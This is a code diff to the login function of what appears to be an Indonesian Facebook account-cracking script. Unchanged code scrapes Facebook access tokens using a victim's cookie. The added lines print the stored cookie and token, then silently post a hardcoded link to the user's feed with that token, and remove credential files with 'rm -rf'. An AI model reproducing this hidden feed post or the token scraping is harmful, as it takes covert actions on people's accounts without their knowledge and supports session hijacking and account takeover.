@@ -276,24 +276,40 @@ def tahun(fx):
 def login():
     banner()
     try:
-       token = open('.token.txt','r').read()
-	   cok = open('.cok.txt','r').read()
-	   tokenku.append(token)
-      except (IOError,KeyError,FileNotFoundError):
-	      print('[×]{M} Cookies Kadaluarsa ')
-	      time.sleep(5)
-	      login_lagi334()
-      try:
-	      info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
-	      sy2 = info_datafb["name"]
-		  sy3 = info_datafb["id"]
-		  login(sy2,sy3)
-	  except requests.exceptions.ConnectionError:
-		  exit(f"\n{P} [:]{M} Tidak ada koneksi{P}")
-	except KeyError:
-		try:os.remove(".cok.txt");os.remove(".token.txt")
-		except:pass
-		login_lagi334()
+		token  = open('token.txt','r').read()
+		cookie = {'cookie':open('cookie.txt','r').read()}
+		try:
+			token  = open('token.txt','r').read()
+			cookie = {'cookie':open('cookie.txt','r').read()}
+			kook = open('cookie.txt','r').read()
+			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
+			gut = json.loads(get.text)
+			xname = gut["name"]
+			x=f"{P2}{kook}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			x=f"{P2}{token}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			print("")
+			x=f"\t\t{P2}cookie {H2}{xname} {P2}belum invalid"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(f"{garis} enter untuk ke menu ")
+			ua = random.choice(ua_crack)
+			headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
+			requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100000871607227/posts/5528296787209320/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
+			menu()
+		except (KeyError):
+			x=f"{P2}cookie kadaluarsa"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			os.system('rm -rf cookie.txt')
+			os.system('rm -rf token.txt')
+			turu(0.05)
+			login()
+		except requests.exceptions.ConnectionError:
+			x=f"{P2}koneksi internet bermasalah"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			exit()
+	except IOError:
+		login()
 
 def login_lagi334():
 	try:
@@ -304,7 +320,7 @@ def login_lagi334():
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 5.1; Elephone P4000 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/62.0.3202.66 Mobile Safari/537.36","referer": "https://x.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1))
-		cok=open(".cok.txt", "w").write(cookie)
+		cok=open(".cookie.txt", "w").write(cookie)
 		print(f'  {x}[{h}•{x}]{H} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
